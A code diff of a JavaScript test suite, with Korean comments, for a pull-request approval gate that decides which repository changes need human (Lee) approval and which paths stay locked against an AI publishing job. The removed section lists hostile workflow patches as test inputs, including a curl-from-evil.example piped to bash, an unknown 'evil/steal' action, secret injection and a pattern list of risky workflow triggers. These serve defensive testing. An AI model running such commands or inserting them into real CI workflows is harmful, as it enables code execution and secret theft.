@@ -1,5 +1,5 @@
 import assert from 'node:assert/strict'
-import { decisionApproval as rawDecisionApproval, requestText, approvedFramePaths, NEEDS_LEE_LABEL, GATE_CODE } from './decision-approval-gate.mjs'
+import { decisionApproval as rawDecisionApproval, requestText, approvedFramePaths, NEEDS_LEE_LABEL, GATE_CODE, AI_LOCKED } from './decision-approval-gate.mjs'
 import { readFileSync } from 'node:fs'
 // 기존 시험은 승인 흐름만 본다 — 고위험 PR의 4대 보고(⑧)는 기본으로 갖춘 본문을 넣고, 보고 자체는 아래 ⑧ 시험이 따로 본다.
 const GOOD_BODY = ['## 고위험 4대 보고', '- 무엇을 바꾸나: 시험용 변경 내용', '- 왜 필요한가: 시험용 이유 설명', '- 승인 시 남는 위험: 시험용 남는 위험', '- 미승인 시 영향: 시험용 영향 설명', '- 검증: https://github.com/KHOAILANG0926/jobi-app/actions/runs/1', ''].join('\n')
@@ -46,13 +46,23 @@ assert.equal(gate({ files: [{ filename: 'src/pages/Home.tsx', patch: '+x' }] }).
 assert.equal(gate({ labels: [NEEDS_LEE_LABEL] }).approved, false, 'needs-lee 라벨이 붙은 PR은 승인 전 병합 안 됨')
 assert.deepEqual(gate({ labels: [NEEDS_LEE_LABEL] }).reasons, ['needs-lee 라벨'])
 assert.equal(gate({ labels: [NEEDS_LEE_LABEL], reviews: leeReview }).approved, true, 'Lee 승인 리뷰가 head에 있으면 라벨 PR도 병합')
-// S3-2 ④ 검사·보호 장치 변경(검사 약화 가능) = Lee 승인 대상
-for (const f of ['.github/workflows/pr-checks.yml', '.github/approved-migrations.json', 'scripts/ci/merge-provenance.mjs', 'scripts/status/generate-status.mjs', 'scripts/check-pr-ready.mjs', 'scripts/codex-review-gate.mjs', 'scripts/decision-approval-gate.mjs', 'scripts/approved-migrations.mjs', 'AGENTS.md']) {
+// S3-2 ④ → 엔진 정리 1차(Lee 2026-11-22 중간안): 승인 장치 자체(판정·보호 목록·병합 실행기·Claude 게시 검증·비밀값 격리·migration 허용표·검토 기준)만 Lee 승인 대상
+for (const f of ['.github/approved-migrations.json', '.github/workflows/bot-pr-automerge.yml', '.github/workflows/approval-checks.yml', 'scripts/ci/protected-paths.mjs', 'scripts/ci/claude-publish.mjs', 'scripts/decision-approval-gate.mjs', 'scripts/approved-migrations.mjs', 'AGENTS.md']) {
   assert.ok(GATE_CODE(f), `${f} is gate code`)
   assert.equal(gate({ files: [{ filename: f }] }).approved, false, `${f} change needs Lee approval`)
   assert.deepEqual(gate({ files: [{ filename: f }] }).reasons, ['검사·보호 장치'])
   assert.equal(gate({ files: [{ filename: f }], reviews: leeReview }).approved, true, `${f} with Lee review passes`)
 }
+// 검사 스크립트·일반 워크플로·자동 작업 설정은 이제 승인 없이 기본 검사 통과 뒤 병합(내용 위험 줄이 없을 때)
+for (const f of ['.github/workflows/pr-checks.yml', '.github/workflows/refresh-facebook-existing.yml', 'scripts/ci/merge-provenance.mjs', 'scripts/status/generate-status.mjs', 'scripts/check-pr-ready.mjs', 'scripts/codex-review-gate.mjs']) {
+  assert.ok(!GATE_CODE(f), `${f} is no longer gate code`)
+  assert.equal(gate({ files: [{ filename: f, status: 'modified', patch: '@@\n+echo ok' }] }).required, false, `${f} 일반 변경은 Lee 승인 불필요`)
+}
+// 일반 워크플로여도 열쇠 환경·쓰기 권한·실행 계기를 바꾸면 바뀐 줄 내용 위험(⑦)으로 Lee 승인
+for (const line of ['+    environment: ops-keys', '+  contents: write', '+  id-token: write', '+  pull_request_target:'])
+  assert.equal(gate({ files: [{ filename: '.github/workflows/x.yml', status: 'modified', patch: '@@\n' + line }] }).approved, false, `워크플로 위험 줄은 Lee 승인: ${line}`)
+// 승인 범위를 줄여도 Claude 게시 잡이 못 고치는 곳(AI_LOCKED)은 예전 목록 그대로
+for (const f of ['.github/workflows/pr-checks.yml', 'scripts/ci/merge-provenance.mjs', 'scripts/status/x.mjs', 'scripts/check-pr-ready.mjs', 'scripts/codex-review-gate.mjs']) assert.ok(AI_LOCKED(f), `${f} stays locked for Claude`)
 for (const f of ['scripts/ops/x.mjs', 'supabase/migrations/20261114_x.sql', 'CLAUDE.md', 'src/lib/a.ts', 'scripts/checkpoint.mjs']) assert.ok(!GATE_CODE(f), `${f} is not gate code`)
 assert.equal(gate({ labels: ['ai-team'] }).required, false, '다른 라벨은 영향 없음')
 assert.equal(gate({ labels: [NEEDS_LEE_LABEL], files: frame }).reasons.length, 2, '둘 다 해당하면 이유 두 가지')
@@ -167,7 +177,7 @@ console.log('decision-approval-gate: decision/CODEOWNERS PRs need Lee approval a
     const r = run([p]); assert.equal(r.approved, true, `정상 통과: ${p}`); assert.equal(r.risk, 'normal', p)
   }
   // 고위험: Lee 승인 전 막힘, 승인 뒤 통과
-  for (const p of ['.github/workflows/x.yml', 'scripts/ci/claude-publish.mjs', 'docs/decisions/ko/0009-x.md', 'AGENTS.md', 'scripts/check-repository-policy.mjs']) {
+  for (const p of ['.github/workflows/bot-pr-automerge.yml', 'scripts/ci/claude-publish.mjs', 'docs/decisions/ko/0009-x.md', 'AGENTS.md', 'scripts/check-approval-scope.mjs']) {
     const r = run([p]); assert.equal(r.approved, false, `고위험 막힘: ${p}`); assert.equal(r.risk, 'high', p)
     assert.equal(run([p], lee).approved, true, `고위험 Lee 승인 뒤 통과: ${p}`)
   }
@@ -245,7 +255,7 @@ console.log('decision-approval-gate: decision/CODEOWNERS PRs need Lee approval a
   assert.equal(run([mk('src/a.test.ts', '@@\n+const k = process.env.SUPABASE_SERVICE_ROLE_KEY')]).approved, true, '배포 밖 시험 파일은 제외')
   // 검토관 지적(이름 변경 우회): 고위험 경로의 파일을 일반 경로로 옮겨도 옛 경로(previous_filename)로 고위험 판정
   const mv = (from, to) => ({ filename: to, previous_filename: from, status: 'renamed', changes: 0 })
-  for (const [from, to, why] of [['.github/workflows/pr-checks.yml', 'docs/ops/pr-checks.txt', '워크플로'], ['scripts/check-repository-policy.mjs', 'scripts/ops/x.mjs', '검사 스크립트'],
+  for (const [from, to, why] of [['.github/workflows/bot-pr-automerge.yml', 'docs/ops/bot.txt', '워크플로'], ['scripts/check-approval-scope.mjs', 'scripts/ops/x.mjs', '검사 스크립트'],
     ['scripts/decision-approval-gate.mjs', 'src/lib/g.ts', '판정 스크립트'], ['.github/CODEOWNERS', 'docs/co.txt', 'CODEOWNERS'], ['docs/decisions/ko/0003-x.md', 'docs/ops/0003-x.md', '결정 문서'],
     ['scripts/ci/claude-publish.mjs', 'crawler/p.py', 'scripts/ci'], ['AGENTS.md', 'docs/AGENTS.md', 'AGENTS.md']]) {
     const r = run([mv(from, to)])
@@ -257,7 +267,7 @@ console.log('decision-approval-gate: decision/CODEOWNERS PRs need Lee approval a
   assert.equal(run([mv('src/lib/a.ts', 'src/lib/b.ts')]).approved, true, '일반 경로끼리 이동은 통과')
   assert.equal(run([mv('docs/a.md', 'docs/b.md')]).approved, true, '문서끼리 이동은 통과')
   // 일반 경로 → 고위험 경로로 옮기는 것은 새 경로로 이미 차단
-  assert.equal(run([mv('docs/x.md', '.github/workflows/x.yml')]).approved, false, '일반 → 워크플로 경로')
+  assert.equal(run([mv('docs/x.md', '.github/workflows/bot-pr-automerge.yml')]).approved, false, '일반 → 워크플로 경로')
   // 이름 변경과 함께 내용도 바뀌면 새 파일 내용도 검사
   assert.equal(run([{ filename: 'src/b.ts', previous_filename: 'src/a.ts', status: 'renamed', changes: 2, patch: '@@\n+const k = process.env.SUPABASE_SERVICE_ROLE_KEY' }]).approved, false, '이름 변경 + 위험 내용')
   // 4대 보고 형식
@@ -280,63 +290,3 @@ console.log('decision-approval-gate: decision/CODEOWNERS PRs need Lee approval a
   console.log('S4 ⑦⑧ 바뀐 줄 내용 위험·4대 보고 시험 통과')
 }
 
-// ⑨ 워크플로 실행 환경·시험 추가(Lee 2026-11-17 도장 찍기 문제) — 실제 #876 변경으로 확인 + 우회·위험 누락 시험
-{
-  const { workflowSafeChange, SAFE_TEST_WORKFLOWS } = await import('./decision-approval-gate.mjs')
-  const P876_CRAWL = "@@ -17,13 +17,16 @@ jobs:\n     # 사용자 지시: 필터 검증·별도 재개 승인 전에는 예약/수동 모두 실행 금지.\n     # 인자는 정합화하되 실제 수집 재개는 별도 승인 PR에서 결정한다.\n     if: ${{ false }}\n-    runs-on: ubuntu-latest\n+    # 재개 승인 전 실행 환경만 맞춤(#872): 마지막 실제 실행 5건(2026-08-24~28)이 모두 의존성 설치에서 실패 —\n+    # ubuntu-latest(24.04)에는 libasound2가 없는데 playwright 1.44 설치 목록에 24.04 항목이 없어 옛 이름을 설치함.\n+    # 같은 crawler/requirements.txt를 쓰는 refresh-facebook-existing.yml과 같은 ubuntu-22.04·Python 3.12로 맞춘다.\n+    runs-on: ubuntu-22.04\n     steps:\n       - uses: actions/checkout@v4\n \n       - uses: actions/setup-python@v5\n         with:\n-          python-version: '3.11'\n+          python-version: '3.12'  # vietnam-provinces==2026.9.0은 Python 3.12 이상(3.11이면 설치 실패)\n \n       - name: 의존성 설치\n         run: |\n"
-  const P876_CLI = "@@ -24,3 +24,28 @@ jobs:\n       - run: python -I crawler/test_ingest_gateway.py\n       - run: python -I crawler/test_korea_fb_survey.py\n       - run: python -I crawler/test_finalize_reprocess_queue.py\n+      # 공고 하나의 오류가 전체 수집을 멈추지 않는지(#872 ②). 브라우저·DB·네트워크 모듈은 시험 안에서 가짜로 바꿔 넣는다(열쇠 없음).\n+      - run: python -I crawler/test_job_error_isolation.py\n+\n+  # 재개 전 설치 확인(#872·#876): crawl.yml과 같은 실행 환경(ubuntu-22.04·Python 3.12)·같은 설치 명령으로 실제 설치가 되는지 본다.\n+  # 2026-08-24~28 crawl.yml 실제 실행 5건이 모두 설치 단계에서 실패(ubuntu-latest + playwright 1.44 → libasound2 없음).\n+  # 열쇠 없음·수집 실행 없음 — 설치 뒤 모듈 불러오기와 오류 격리 시험만 실제 패키지로 돌린다.\n+  crawl-install:\n+    runs-on: ubuntu-22.04\n+    timeout-minutes: 15\n+    steps:\n+      - uses: actions/checkout@v4\n+        with:\n+          persist-credentials: false\n+      - uses: actions/setup-python@v5\n+        with:\n+          python-version: '3.12'\n+      - name: 의존성 설치 (crawl.yml과 같은 명령)\n+        run: |\n+          python -m pip install -r crawler/requirements.txt\n+          python -m playwright install --with-deps chromium\n+      - name: 수집기 모듈 불러오기 (실제 패키지, 열쇠 없음)\n+        working-directory: crawler\n+        run: python -c \"import crawl_topcv, crawl_facebook, ingest_gateway; print('import ok')\"\n+      - name: 오류 격리 시험 (실제 패키지 위에서)\n+        run: python crawler/test_job_error_isolation.py\n"
-  const wf = (filename, patch, status = 'modified', extra = {}) => ({ filename, patch, status, ...extra })
-  const run = (files) => rawDecisionApproval({ files, reviews: [], comments: [], author: 'viecganban-bot', sha, body: '' })
-  // 정상: #876의 실제 변경(실행 서버·Python 판 + 시험 전용 워크플로에 시험 잡 추가)은 Lee 승인 대상이 아님
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', P876_CRAWL)), true, '#876 crawl.yml 실행 환경 수정은 안전')
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawler-cli-tests.yml', P876_CLI)), true, '#876 시험 잡 추가는 안전')
-  assert.equal(run([wf('.github/workflows/crawl.yml', P876_CRAWL), wf('.github/workflows/crawler-cli-tests.yml', P876_CLI), { filename: 'crawler/x.py', patch: '+a = 1' }]).required, false, '#876 같은 PR은 자동 진행')
-  // 위험: 한 줄이라도 안전 줄이 아니면 그대로 Lee 승인(④)
-  const risky = [
-    ['실행 조건 if 바꿈(수집 재개)', '.github/workflows/crawl.yml', "-    if: ${{ false }}\n+    if: github.event_name == 'workflow_dispatch'"],
-    ['if 줄 삭제만', '.github/workflows/crawl.yml', '-    if: ${{ false }}'],
-    ['예약 cron 바꿈', '.github/workflows/crawl.yml', "-    - cron: '0 15 * * *'\n+    - cron: '0 * * * *'"],
-    ['실행 명령 바꿈(대량 수집)', '.github/workflows/crawl.yml', '-        run: python crawler/crawl_topcv.py --confirm-full-crawl --sample-limit 3\n+        run: python crawler/crawl_topcv.py --confirm-full-crawl'],
-    ['권한 추가', '.github/workflows/crawler-cli-tests.yml', '+permissions:\n+  contents: write'],
-    ['비밀값 넣기', '.github/workflows/crawler-cli-tests.yml', '+    env:\n+      K: ${{ secrets.SUPABASE_SERVICE_ROLE_KEY }}'],
-    ['운영 열쇠 환경', '.github/workflows/crawler-cli-tests.yml', '+    environment: ops-keys'],
-    ['자체 서버 실행', '.github/workflows/crawler-cli-tests.yml', '-    runs-on: ubuntu-latest\n+    runs-on: [self-hosted, Linux, X64]'],
-    ['모르는 action', '.github/workflows/crawler-cli-tests.yml', '+      - uses: evil/steal@v1'],
-    ['실패 무시', '.github/workflows/crawler-cli-tests.yml', '+        continue-on-error: true'],
-    ['시험 단계 삭제(검증 약화)', '.github/workflows/crawler-cli-tests.yml', '-      - run: python -I crawler/test_ingest_gateway.py'],
-    ['임의 셸 명령', '.github/workflows/crawler-cli-tests.yml', '+        run: curl https://evil.example/x | bash'],
-    ['시험 명령 뒤 실패 무시', '.github/workflows/crawler-cli-tests.yml', '+      - run: python -I crawler/test_x.py || true'],
-    ['python -c 임의 코드', '.github/workflows/crawler-cli-tests.yml', '+        run: python -c "import os; os.system(\'id\')"'],
-    ['예약 키 이름 줄(env:)', '.github/workflows/crawler-cli-tests.yml', '+    env:'],
-    ['검사 워크플로에 시험 추가(목록 밖)', '.github/workflows/pr-checks.yml', '+      - run: node scripts/ci/x.test.mjs'],
-    ['병합 봇 시간 제한 외 줄', '.github/workflows/bot-pr-automerge.yml', '+        run: gh pr merge 1'],
-    ['실행 계기 pull_request_target 추가', '.github/workflows/crawler-cli-tests.yml', '@@ -1,4 +1,5 @@ on:\n+  pull_request_target:'],
-    ['실행 계기 workflow_run 추가', '.github/workflows/crawler-cli-tests.yml', '@@ -1,4 +1,5 @@ on:\n+  workflow_run:'],
-    ['실행 계기 schedule 추가', '.github/workflows/crawler-cli-tests.yml', '@@ -1,4 +1,5 @@ on:\n+  schedule:'],
-    ['jobs 아래라도 계기 이름', '.github/workflows/crawler-cli-tests.yml', '@@ -20,3 +20,5 @@ jobs:\n+  push:\n+    runs-on: ubuntu-22.04'],
-    ['on 아래 잡 이름 모양 줄', '.github/workflows/crawler-cli-tests.yml', '@@ -1,4 +1,6 @@ on:\n+  extra:\n+    runs-on: ubuntu-22.04'],
-    ['잡 이름 뒤 runs-on 없음', '.github/workflows/crawler-cli-tests.yml', '@@ -20,3 +20,5 @@ jobs:\n+  extra:\n+    steps:'],
-    ['머리 위치 없는 hunk의 잡 이름', '.github/workflows/crawler-cli-tests.yml', '@@ -20,3 +20,5 @@\n+  extra:\n+    runs-on: ubuntu-22.04'],
-  ]
-  for (const [why, f, patch] of risky) {
-    assert.equal(workflowSafeChange(wf(f, patch)), false, `안전 아님: ${why}`)
-    const r = run([wf(f, patch)])
-    assert.equal(r.required && r.reasons.includes('검사·보호 장치'), true, `Lee 승인 유지: ${why}`)
-  }
-  // 판단할 수 없는 형태는 닫힌 실패
-  assert.equal(workflowSafeChange(wf('.github/workflows/new.yml', '+name: x', 'added')), false, '새 워크플로 파일')
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', P876_CRAWL, 'renamed', { previous_filename: '.github/workflows/old.yml' })), false, '이름 바꿈')
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', undefined)), false, '변경 내용 없음')
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', P876_CRAWL, 'removed')), false, '삭제')
-  assert.equal(workflowSafeChange(wf('.github/CODEOWNERS', '-x\n+y')), false, '워크플로 밖 .github 파일')
-  assert.equal(workflowSafeChange(wf('.github/workflows/crawl.yml', '')), false, '빈 변경')
-  assert.equal(run([{ filename: '.github/CODEOWNERS', patch: '+* @x', status: 'modified' }]).required, true, 'CODEOWNERS는 그대로 Lee')
-  // 안전 줄만 있어도 함께 바뀐 다른 고위험 파일은 그대로
-  assert.equal(run([wf('.github/workflows/crawl.yml', P876_CRAWL), { filename: 'scripts/ci/protected-paths.mjs', patch: '+x' }]).required, true, '섞이면 다른 파일 판정 유지')
-  // 시험 전용 목록의 워크플로는 지금도 열쇠·환경·쓰기 권한·특수 실행 계기가 없어야 한다(목록이 맞는지 확인)
-  for (const f of SAFE_TEST_WORKFLOWS) {
-    const src = readFileSync(new URL('../' + f, import.meta.url), 'utf8').split('\n').filter((l) => !/^\s*#/.test(l)).map((l) => l.replace(/\s+#.*$/, '')).join('\n')
-    assert.doesNotMatch(src, /secrets\.|environment:|:\s*write\b|id-token|pull_request_target|workflow_run|issue_comment|self-hosted/, `${f}: 시험 전용이 아님`)
-  }
-  console.log(`⑨ 워크플로 실행 환경·시험 추가 시험 통과(정상 3·위험 ${risky.length}·판단 불가 6·섞임 1·목록 ${SAFE_TEST_WORKFLOWS.length})`)
-}
